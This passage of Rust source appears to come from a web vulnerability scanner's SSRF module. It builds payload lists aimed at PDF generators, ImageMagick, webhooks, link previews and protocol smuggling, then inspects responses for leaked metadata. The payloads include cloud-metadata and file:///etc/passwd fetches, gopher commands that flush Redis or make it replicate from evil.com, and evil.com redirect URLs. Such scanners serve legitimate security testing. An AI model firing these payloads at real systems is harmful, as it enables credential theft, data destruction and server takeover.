                r#"<html><body><iframe src="http://127.0.0.1:80/"></iframe></body></html>"#,
                "wkhtmltopdf iframe localhost",
            ),
            (
                r#"<html><body><iframe src="http://192.168.1.1/admin"></iframe></body></html>"#,
                "wkhtmltopdf iframe internal",
            ),
            (
                r#"<html><body><img src="http://169.254.169.254/latest/meta-data/"></body></html>"#,
                "wkhtmltopdf img metadata",
            ),
            (
                r#"<html><body><object data="http://169.254.169.254/latest/meta-data/"></object></body></html>"#,
                "wkhtmltopdf object metadata",
            ),
            (
                r#"<html><body><embed src="http://169.254.169.254/latest/meta-data/"></body></html>"#,
                "wkhtmltopdf embed metadata",
            ),
        ];

        for (payload, desc) in html_payloads {
            payloads.push(SsrfPayload {
                payload: payload.to_string(),
                category: SsrfBypassCategory::PdfGenerator,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // WeasyPrint CSS injection
        let css_payloads = vec![
            (
                r#"<html><head><link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/"></head><body>Test</body></html>"#,
                "WeasyPrint CSS metadata",
            ),
            (
                r#"<html><head><link rel="stylesheet" href="http://192.168.1.1/style.css"></head><body>Test</body></html>"#,
                "WeasyPrint CSS internal",
            ),
            (
                r#"<html><head><style>@import url('http://169.254.169.254/latest/meta-data/');</style></head><body>Test</body></html>"#,
                "WeasyPrint @import metadata",
            ),
            (
                r#"<html><body style="background: url('http://169.254.169.254/latest/meta-data/')">Test</body></html>"#,
                "WeasyPrint background-url metadata",
            ),
        ];

        for (payload, desc) in css_payloads {
            payloads.push(SsrfPayload {
                payload: payload.to_string(),
                category: SsrfBypassCategory::PdfGenerator,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // Headless Chrome payloads
        let chrome_payloads = vec![
            (
                r#"<html><body><img src="http://169.254.169.254/latest/meta-data/"></body></html>"#,
                "Chrome headless img metadata",
            ),
            (
                r#"<html><body><script src="http://169.254.169.254/latest/meta-data/"></script></body></html>"#,
                "Chrome headless script metadata",
            ),
            (
                r#"<html><head><link rel="prefetch" href="http://169.254.169.254/latest/meta-data/"></head><body>Test</body></html>"#,
                "Chrome headless prefetch metadata",
            ),
        ];

        for (payload, desc) in chrome_payloads {
            payloads.push(SsrfPayload {
                payload: payload.to_string(),
                category: SsrfBypassCategory::PdfGenerator,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // SVG-based payloads (embedded in HTML)
        let svg_payloads = vec![
            (
                r#"<html><body><svg><image xlink:href="http://169.254.169.254/latest/meta-data/"></image></svg></body></html>"#,
                "SVG image xlink metadata",
            ),
            (
                r#"<html><body><svg><use xlink:href="http://169.254.169.254/latest/meta-data/"></use></svg></body></html>"#,
                "SVG use xlink metadata",
            ),
            (
                r#"<html><body><svg><foreignObject><img src="http://169.254.169.254/latest/meta-data/"/></foreignObject></svg></body></html>"#,
                "SVG foreignObject img metadata",
            ),
        ];

        for (payload, desc) in svg_payloads {
            payloads.push(SsrfPayload {
                payload: payload.to_string(),
                category: SsrfBypassCategory::PdfGenerator,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // File protocol via PDF generators
        let file_payloads = vec![
            (
                r#"<html><body><iframe src="file:///etc/passwd"></iframe></body></html>"#,
                "PDF generator file:// /etc/passwd",
            ),
            (
                r#"<html><body><img src="file:///etc/hosts"></body></html>"#,
                "PDF generator file:// /etc/hosts",
            ),
        ];

        for (payload, desc) in file_payloads {
            payloads.push(SsrfPayload {
                payload: payload.to_string(),
                category: SsrfBypassCategory::PdfGenerator,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        payloads
    }

    /// Generate Image Processor SSRF payloads
    /// Tests ImageMagick, GraphicsMagick, and other image processing SSRF vectors
    fn generate_image_processor_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // SVG with embedded SSRF for ImageMagick/GraphicsMagick
        let svg_payloads = vec![
            (
                r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>"#,
                "ImageMagick SVG xlink metadata",
            ),
            (
                r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://127.0.0.1:6379/"/></svg>"#,
                "ImageMagick SVG xlink localhost Redis",
            ),
            (
                r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://192.168.1.1/admin"/></svg>"#,
                "ImageMagick SVG xlink internal",
            ),
            (
                r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>"#,
                "ImageMagick SVG use xlink metadata",
            ),
        ];

        for (payload, desc) in svg_payloads {
            payloads.push(SsrfPayload {
                payload: payload.to_string(),
                category: SsrfBypassCategory::ImageProcessor,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // ImageMagick MVG (Magick Vector Graphics) payloads
        let mvg_payloads = vec![
            (
                r#"push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'http://169.254.169.254/latest/meta-data/' pop graphic-context"#,
                "ImageMagick MVG metadata",
            ),
            (
                r#"push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'http://127.0.0.1:80/' pop graphic-context"#,
                "ImageMagick MVG localhost",
            ),
        ];

        for (payload, desc) in mvg_payloads {
            payloads.push(SsrfPayload {
                payload: payload.to_string(),
                category: SsrfBypassCategory::ImageProcessor,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // MSL (Magick Scripting Language) - ImageMagick specific
        let msl_payloads = vec![
            (
                r#"<?xml version="1.0" encoding="UTF-8"?><image><read filename="http://169.254.169.254/latest/meta-data/" /></image>"#,
                "ImageMagick MSL read metadata",
            ),
            (
                r#"<?xml version="1.0" encoding="UTF-8"?><image><read filename="http://127.0.0.1/" /></image>"#,
                "ImageMagick MSL read localhost",
            ),
        ];

        for (payload, desc) in msl_payloads {
            payloads.push(SsrfPayload {
                payload: payload.to_string(),
                category: SsrfBypassCategory::ImageProcessor,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // URL-based image references (for endpoints that fetch images)
        let url_payloads = vec![
            (
                "https://example.com/logo.svg#http://169.254.169.254/latest/meta-data/",
                "SVG URL fragment metadata",
            ),
            (
                "https://example.com/logo.svg?url=http://169.254.169.254/latest/meta-data/",
                "SVG URL param metadata",
            ),
            (
                "http://169.254.169.254/latest/meta-data/logo.svg",
                "Direct SVG metadata URL",
            ),
            ("http://127.0.0.1/image.png", "Direct localhost image"),
            ("http://192.168.1.1/admin/logo.png", "Direct internal image"),
        ];

        for (url, desc) in url_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ImageProcessor,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // File protocol for image processors
        let file_payloads = vec![
            ("file:///etc/passwd", "ImageMagick file:// /etc/passwd"),
            ("file:///etc/hosts", "ImageMagick file:// /etc/hosts"),
            ("file:///proc/self/environ", "ImageMagick file:// environ"),
        ];

        for (url, desc) in file_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ImageProcessor,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        payloads
    }

    /// Generate advanced protocol smuggling payloads beyond basic file/gopher
    fn generate_advanced_protocol_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // Extended gopher payloads
        let gopher_payloads = vec![
            ("gopher://127.0.0.1:6379/_SET%20key%20value", "Gopher Redis SET"),
            ("gopher://127.0.0.1:6379/_GET%20key", "Gopher Redis GET"),
            ("gopher://127.0.0.1:6379/_FLUSHALL", "Gopher Redis FLUSHALL"),
            ("gopher://127.0.0.1:6379/_SLAVEOF%20evil.com%206379", "Gopher Redis SLAVEOF"),
            ("gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254", "Gopher AWS metadata"),
            ("gopher://127.0.0.1:9000/_", "Gopher FastCGI"),
            ("gopher://127.0.0.1:11211/_set%20test%200%200%205%0D%0Avalue", "Gopher Memcached SET"),
        ];

        for (url, desc) in gopher_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // Dict protocol for various services
        let dict_payloads = vec![
            ("dict://127.0.0.1:6379/info", "Dict Redis info"),
            ("dict://127.0.0.1:6379/config:GET:*", "Dict Redis config"),
            ("dict://127.0.0.1:11211/stats", "Dict Memcached stats"),
            ("dict://127.0.0.1:11211/version", "Dict Memcached version"),
            ("dict://169.254.169.254:80/latest", "Dict AWS metadata"),
        ];

        for (url, desc) in dict_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // LDAP protocol
        let ldap_payloads = vec![
            ("ldap://127.0.0.1:389/", "LDAP localhost"),
            ("ldap://127.0.0.1:389/dc=example,dc=com", "LDAP query"),
            ("ldap://internal.local:389/", "LDAP internal"),
            ("ldaps://127.0.0.1:636/", "LDAPS localhost"),
        ];

        for (url, desc) in ldap_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // JAR protocol (Java)
        let jar_payloads = vec![
            ("jar:http://127.0.0.1/malicious.jar!/", "JAR localhost"),
            (
                "jar:http://169.254.169.254/latest/meta-data/!/",
                "JAR AWS metadata",
            ),
            ("jar:file:///etc/passwd!/", "JAR file protocol"),
        ];

        for (url, desc) in jar_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // Additional file:// paths
        let file_paths = vec![
            (
                "file:///c:/windows/system32/drivers/etc/hosts",
                "Windows hosts",
            ),
            ("file:///c:/windows/win.ini", "Windows win.ini"),
            ("file:///c:/boot.ini", "Windows boot.ini"),
            (
                "file://\\\\127.0.0.1\\c$\\windows\\win.ini",
                "UNC localhost",
            ),
            ("file://127.0.0.1/etc/passwd", "File with host"),
        ];

        for (url, desc) in file_paths {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        payloads
    }

    /// Generate URL Preview/Unfurling SSRF payloads
    /// Tests Slack-style link preview functionality and OpenGraph fetchers
    fn generate_url_preview_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // Direct metadata URLs for preview
        let preview_urls = vec![
            (
                "http://169.254.169.254/latest/meta-data/",
                "Preview AWS metadata",
            ),
            (
                "http://metadata.google.internal/computeMetadata/v1/",
                "Preview GCP metadata",
            ),
            ("http://127.0.0.1/", "Preview localhost"),
            ("http://127.0.0.1:6379/", "Preview Redis"),
            ("http://127.0.0.1:9200/", "Preview Elasticsearch"),
            ("http://192.168.1.1/", "Preview internal network"),
            ("http://10.0.0.1/admin", "Preview internal admin"),
            ("http://localhost:8080/", "Preview localhost alt port"),
        ];

        for (url, desc) in preview_urls {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::UrlPreview,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // Redirect-based preview bypass
        // These would require a redirect service, but we test the pattern
        let redirect_patterns = vec![
            (
                "http://evil.com/redirect?url=http://169.254.169.254/latest/meta-data/",
                "Preview redirect metadata",
            ),
            (
                "http://evil.com/redirect?url=http://127.0.0.1/",
                "Preview redirect localhost",
            ),
            (
                "http://evil.com/r?to=http://192.168.1.1/admin",
                "Preview redirect internal",
            ),
        ];

        for (url, desc) in redirect_patterns {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::UrlPreview,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // OpenGraph meta tag URLs (these get fetched by preview tools)
        let opengraph_urls = vec![
            (
                "http://169.254.169.254/latest/meta-data/og-image.jpg",
                "OpenGraph metadata image",
            ),
            ("http://127.0.0.1/og-image.png", "OpenGraph localhost image"),
            ("http://192.168.1.1/preview.jpg", "OpenGraph internal image"),
        ];

        for (url, desc) in opengraph_urls {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::UrlPreview,
                description: desc.to_string(),
                severity: Severity::Medium,
            });
        }

        // Protocol-based preview bypass
        let protocol_previews = vec![
            ("file:///etc/passwd", "Preview file protocol"),
            ("gopher://127.0.0.1:6379/_INFO", "Preview gopher Redis"),
            ("dict://127.0.0.1:11211/stats", "Preview dict Memcached"),
        ];

        for (url, desc) in protocol_previews {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::UrlPreview,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        payloads
    }

    /// Generate Webhook SSRF payloads
    /// Tests webhook registration and callback mechanisms
    fn generate_webhook_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // Internal network webhooks
        let webhook_urls = vec![
            ("http://192.168.1.1/admin", "Webhook internal admin"),
            ("http://192.168.1.1:8080/", "Webhook internal 8080"),
            ("http://10.0.0.1/", "Webhook 10.0.0.1"),
            ("http://10.0.0.1:9000/", "Webhook 10.0.0.1:9000"),
            ("http://172.16.0.1/", "Webhook 172.16.0.1"),
            ("http://172.16.0.1:8443/", "Webhook 172.16.0.1:8443"),
        ];

        for (url, desc) in webhook_urls {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::WebhookSsrf,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // Localhost webhooks
        let localhost_webhooks = vec![
            ("http://127.0.0.1/webhook", "Webhook localhost"),
            ("http://127.0.0.1:8080/callback", "Webhook localhost 8080"),
            ("http://localhost/admin", "Webhook localhost admin"),
            ("http://localhost:3000/", "Webhook localhost 3000"),
            ("http://[::1]/", "Webhook IPv6 localhost"),
            ("http://0.0.0.0/", "Webhook 0.0.0.0"),
        ];

        for (url, desc) in localhost_webhooks {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::WebhookSsrf,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // Cloud metadata webhooks
        let metadata_webhooks = vec![
            (
                "http://169.254.169.254/latest/meta-data/",
                "Webhook AWS metadata",
            ),
            (
                "http://metadata.google.internal/computeMetadata/v1/",
                "Webhook GCP metadata",
            ),
            (
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "Webhook Azure metadata",
            ),
        ];

        for (url, desc) in metadata_webhooks {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::WebhookSsrf,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // Service discovery webhooks
        let service_webhooks = vec![
            ("http://redis:6379/", "Webhook Redis service"),
            (
                "http://elasticsearch:9200/",
                "Webhook Elasticsearch service",
            ),
            ("http://mysql:3306/", "Webhook MySQL service"),
            ("http://postgres:5432/", "Webhook PostgreSQL service"),
            ("http://mongodb:27017/", "Webhook MongoDB service"),
            ("http://kafka:9092/", "Webhook Kafka service"),
        ];

        for (url, desc) in service_webhooks {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::WebhookSsrf,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // Protocol-based webhooks
        let protocol_webhooks = vec![
            ("file:///etc/passwd", "Webhook file protocol"),
            ("gopher://127.0.0.1:6379/_INFO", "Webhook gopher Redis"),
            ("dict://127.0.0.1:11211/stats", "Webhook dict Memcached"),
        ];

        for (url, desc) in protocol_webhooks {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::WebhookSsrf,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        payloads
    }

    /// Generate OOB (Out-of-Band) DNS exfiltration payloads
    /// These use DNS callbacks to detect blind SSRF vulnerabilities
    fn generate_oob_dns_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // Create OOB detector for generating callback URLs
        let oob = OobDetector::new();

        // DNS exfiltration via HTTP callbacks
        let dns_callback = oob.generate_dns_payload(OobVulnType::Ssrf);

        // HTTP request to trigger DNS lookup
        payloads.push(SsrfPayload {
            payload: format!("http://{}/", dns_callback),
            category: SsrfBypassCategory::DnsExfiltration,
            description: "DNS callback detection".to_string(),
            severity: Severity::High,
        });

        payloads.push(SsrfPayload {
            payload: format!("https://{}/", dns_callback),
            category: SsrfBypassCategory::DnsExfiltration,
            description: "DNS callback HTTPS".to_string(),
            severity: Severity::High,
        });

        // Gopher protocol with DNS callback
        let gopher_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
        payloads.push(SsrfPayload {
            payload: format!("gopher://{}:80/_GET%20/%20HTTP/1.1", gopher_callback),
            category: SsrfBypassCategory::DnsExfiltration,
            description: "Gopher DNS callback".to_string(),
            severity: Severity::High,
        });

        // Dict protocol with DNS callback
        let dict_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
        payloads.push(SsrfPayload {
            payload: format!("dict://{}:11211/stats", dict_callback),
            category: SsrfBypassCategory::DnsExfiltration,
            description: "Dict DNS callback".to_string(),
            severity: Severity::High,
        });

        // LDAP with DNS callback
        let ldap_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
        payloads.push(SsrfPayload {
            payload: format!("ldap://{}:389/", ldap_callback),
            category: SsrfBypassCategory::DnsExfiltration,
            description: "LDAP DNS callback".to_string(),
            severity: Severity::High,
        });

        // FTP with DNS callback
        let ftp_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
        payloads.push(SsrfPayload {
            payload: format!("ftp://{}:21/", ftp_callback),
            category: SsrfBypassCategory::DnsExfiltration,
            description: "FTP DNS callback".to_string(),
            severity: Severity::High,
        });

        // TFTP with DNS callback
        let tftp_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
        payloads.push(SsrfPayload {
            payload: format!("tftp://{}/test.txt", tftp_callback),
            category: SsrfBypassCategory::DnsExfiltration,
            description: "TFTP DNS callback".to_string(),
            severity: Severity::High,
        });

        // File protocol with DNS callback (some parsers make DNS lookups for UNC paths)
        let file_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
        payloads.push(SsrfPayload {
            payload: format!("file://{}//etc/passwd", file_callback),
            category: SsrfBypassCategory::DnsExfiltration,
            description: "File UNC DNS callback".to_string(),
            severity: Severity::High,
        });

        // SMB/UNC path for Windows (triggers DNS lookup)
        let smb_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
        payloads.push(SsrfPayload {
            payload: format!("\\\\{}\\share\\file.txt", smb_callback),
            category: SsrfBypassCategory::DnsExfiltration,
            description: "SMB UNC DNS callback".to_string(),
            severity: Severity::High,
        });

        payloads
    }

    /// Generate focused API payloads for GraphQL/REST JSON APIs
    /// Only tests cloud metadata + localhost (most relevant for APIs)
    fn generate_focused_api_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // Cloud metadata - CRITICAL for APIs running in cloud
        payloads.extend(
            self.generate_cloud_metadata_payloads()
                .into_iter()
                .take(150),
        );

        // Localhost variants - APIs often access internal services
        for host in &[
            "127.0.0.1",
            "localhost",
            "0.0.0.0",
            "[::1]",
            "2130706433",
            "0x7f000001",
            "127.1",
            "127.0.1",
        ] {
            payloads.push(SsrfPayload {
                payload: format!("http://{}/", host),
                category: SsrfBypassCategory::LocalhostBypass,
                description: format!("Localhost via {}", host),
                severity: Severity::High,
            });
        }

        // Internal network (limited for APIs)
        for ip in &["192.168.1.1", "10.0.0.1", "172.16.0.1"] {
            payloads.push(SsrfPayload {
                payload: format!("http://{}/", ip),
                category: SsrfBypassCategory::InternalNetwork,
                description: format!("Internal network {}", ip),
                severity: Severity::Medium,
            });
        }

        info!(
            "[SSRF] Generated {} focused API payloads (optimized for GraphQL/REST)",
            payloads.len()
        );
        payloads
    }

    /// Generate enterprise-grade SSRF payloads (3000+)
    fn generate_enterprise_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // Cloud metadata - most critical (AWS, GCP, Azure, etc.)
        payloads.extend(self.generate_cloud_metadata_payloads());

        // AWS IMDSv2 specific payloads
        payloads.extend(self.generate_imdsv2_payloads());

        // Localhost bypasses with all variations
        payloads.extend(self.generate_localhost_payloads());

        // Internal network discovery
        payloads.extend(self.generate_internal_network_payloads());

        // Protocol smuggling (file, gopher, dict, ldap, tftp, etc.)
        payloads.extend(self.generate_protocol_payloads());

        // Advanced protocol smuggling (extended gopher, dict, ldap, jar)
        payloads.extend(self.generate_advanced_protocol_payloads());

        // URL parser differentials
        payloads.extend(self.generate_url_parser_payloads());

        // DNS rebinding
        payloads.extend(self.generate_dns_rebinding_payloads());

        // PDF Generator SSRF (wkhtmltopdf, WeasyPrint, Headless Chrome)
        payloads.extend(self.generate_pdf_generator_payloads());

        // Image Processor SSRF (ImageMagick, GraphicsMagick)
        payloads.extend(self.generate_image_processor_payloads());

        // URL Preview/Unfurling SSRF (Slack-style previews, OpenGraph)
        payloads.extend(self.generate_url_preview_payloads());

        // Webhook SSRF
        payloads.extend(self.generate_webhook_payloads());

        info!("[SSRF] Generated {} enterprise payloads", payloads.len());
        payloads
    }

    /// Professional tier (subset)
    fn generate_professional_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // Only critical cloud metadata
        payloads.extend(
            self.generate_cloud_metadata_payloads()
                .into_iter()
                .take(100),
        );

        // Basic localhost
        for host in &[
            "127.0.0.1",
            "localhost",
            "0.0.0.0",
            "[::1]",
            "2130706433",
            "0x7f000001",
        ] {
            payloads.push(SsrfPayload {
                payload: format!("http://{}/", host),
                category: SsrfBypassCategory::LocalhostBypass,
                description: format!("Localhost via {}", host),
                severity: Severity::High,
            });
        }

        // Basic file protocol
        for path in &["/etc/passwd", "/etc/hosts", "/proc/self/environ"] {
            payloads.push(SsrfPayload {
                payload: format!("file://{}", path),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: format!("File {}", path),
                severity: Severity::Critical,
            });
        }

        payloads
    }

    /// Basic tier (minimal)
    fn generate_basic_payloads(&self) -> Vec<SsrfPayload> {
        vec![
            SsrfPayload {
                payload: "http://169.254.169.254/latest/meta-data/".to_string(),
                category: SsrfBypassCategory::CloudMetadata,
                description: "AWS metadata".to_string(),
                severity: Severity::Critical,
            },
            SsrfPayload {
                payload: "http://127.0.0.1/".to_string(),
                category: SsrfBypassCategory::LocalhostBypass,
                description: "Localhost".to_string(),
                severity: Severity::High,
            },
            SsrfPayload {
                payload: "file:///etc/passwd".to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: "File /etc/passwd".to_string(),
                severity: Severity::Critical,
            },
        ]
    }

    /// Analyze response for SSRF indicators
    fn analyze_ssrf_response(
        &self,
        response: &HttpResponse,
        ssrf_payload: &SsrfPayload,
        parameter: &str,
        test_url: &str,
        baseline: &HttpResponse,
    ) -> Option<Vulnerability> {
        Self::analyze_ssrf_response_static(response, ssrf_payload, parameter, test_url, baseline)
    }

    /// Static version for use in async contexts without &self
    fn analyze_ssrf_response_static(
        response: &HttpResponse,
        ssrf_payload: &SsrfPayload,
        parameter: &str,
        test_url: &str,
        baseline: &HttpResponse,
    ) -> Option<Vulnerability> {
        let body_lower = response.body.to_lowercase();
        let baseline_lower = baseline.body.to_lowercase();

        let size_diff = (response.body.len() as i64 - baseline.body.len() as i64).abs();
        let significant_change = size_diff > 50 || response.status_code != baseline.status_code;

        // AWS indicators
        let aws_indicators = [
            "ami-id",
            "instance-id",
            "availability-zone",
            "iam/security-credentials",
            "accesskeyid",
            "secretaccesskey",
            "token",
            "meta-data",
            "user-data",
            "public-ipv4",
            "local-ipv4",
            "instance-type",
        ];

        // GCP indicators
        let gcp_indicators = [
            "computemetadata",
            "service-accounts",
            "project-id",
            "instance/zone",
            "access_token",
            "token_type",
        ];

        // Azure indicators
        let azure_indicators = [
            "subscriptionid",
            "resourcegroupname",
            "vmid",
            "platformfaultdomain",
            "managedidentity",
            "oauth2/token",
        ];

        // Internal service indicators
        let internal_indicators = [
            "root:x:",
            "daemon:x:",
            "redis_version",
            "elasticsearch",
            "mongodb",
            "postgresql",
            "mysql",
            "nginx",
            "apache",
            "uid=",
            "gid=",
        ];

        for indicator in &aws_indicators {
            if body_lower.contains(indicator)
                && !baseline_lower.contains(indicator)
                && significant_change
            {
                return Some(Self::create_vulnerability_static(
                    parameter,
                    &ssrf_payload.payload,
                    test_url,
                    &format!(
                        "AWS metadata accessible via {}",
                        ssrf_payload.category.as_str()
                    ),
                    Confidence::High,
                    format!("AWS indicator: {}", indicator),
                    &ssrf_payload.category,
                ));
            }
        }

        for indicator in &gcp_indicators {
            if body_lower.contains(indicator)
                && !baseline_lower.contains(indicator)
                && significant_change
            {
                return Some(Self::create_vulnerability_static(
                    parameter,
                    &ssrf_payload.payload,
                    test_url,
                    &format!(
                        "GCP metadata accessible via {}",
                        ssrf_payload.category.as_str()
                    ),
                    Confidence::High,
                    format!("GCP indicator: {}", indicator),
                    &ssrf_payload.category,
                ));
            }
        }

        for indicator in &azure_indicators {
            if body_lower.contains(indicator)
                && !baseline_lower.contains(indicator)
                && significant_change
            {
                return Some(Self::create_vulnerability_static(
                    parameter,
                    &ssrf_payload.payload,
                    test_url,
                    &format!(
                        "Azure metadata accessible via {}",
                        ssrf_payload.category.as_str()
                    ),
                    Confidence::High,
                    format!("Azure indicator: {}", indicator),
                    &ssrf_payload.category,
                ));
            }
        }

        for indicator in &internal_indicators {
            if body_lower.contains(indicator)
                && !baseline_lower.contains(indicator)
                && significant_change
            {
                return Some(Self::create_vulnerability_static(
                    parameter,
                    &ssrf_payload.payload,
                    test_url,
                    &format!(
                        "Internal service accessible via {}",
                        ssrf_payload.category.as_str()
                    ),
                    Confidence::High,
                    format!("Internal indicator: {}", indicator),
                    &ssrf_payload.category,
                ));
            }
        }

        None
    }

    fn create_vulnerability(
        &self,
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
        category: &SsrfBypassCategory,
    ) -> Vulnerability {
        Self::create_vulnerability_static(
            parameter,
            payload,
            test_url,
            description,
            confidence,
            evidence,
            category,
        )
    }

    fn create_vulnerability_static(
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
        category: &SsrfBypassCategory,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("ssrf_{:x}", rand::random::<u32>()),
            vuln_type: format!("SSRF ({})", category.as_str()),
            severity: Severity::Critical,
            confidence,
            category: "SSRF".to_string(),
            url: test_url.to_string(),
            parameter: Some(parameter.to_string()),
            payload: payload.to_string(),
            description: format!("SSRF in '{}': {}. Bypass: {}", parameter, description, category.as_str()),
            evidence: Some(evidence),
            cwe: "CWE-918".to_string(),
            cvss: 9.1,
            verified: true,
            false_positive: false,
            remediation: "Validate and sanitize all URLs. Use allowlists, block private IPs, disable unnecessary protocols.".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
        }
    }
}
